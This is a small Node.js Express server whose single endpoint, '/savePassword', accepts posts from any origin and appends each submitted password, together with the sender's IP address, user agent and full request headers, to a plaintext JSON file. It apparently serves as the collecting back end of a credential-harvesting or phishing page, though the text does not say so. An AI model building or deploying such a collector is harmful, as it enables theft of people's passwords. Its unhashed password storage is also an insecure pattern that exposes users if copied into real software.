import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import fs from 'fs';

const app = express();
const PORT = 5000;

app.use(bodyParser.json());
app.use(cors());

app.post('/savePassword', (req, res) => {
    const { ip, userAgent, headers, password } = req.body;
  
    try {
      const fileContent = fs.readFileSync('passwords.json', 'utf-8');
      const data = fileContent ? JSON.parse(fileContent) : [];
  
      const newPassword = { ip, userAgent, headers, password };
      data.push(newPassword);
  
      fs.writeFileSync('passwords.json', JSON.stringify(data, null, 2));
  
      res.status(200).json({ message: 'Password saved successfully!' });
    } catch (error) {
      console.error('Error during file operation:', error);
      res.status(500).json({ message: 'Error saving password. Please try again.', error: error.message });
    }
  });
  

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
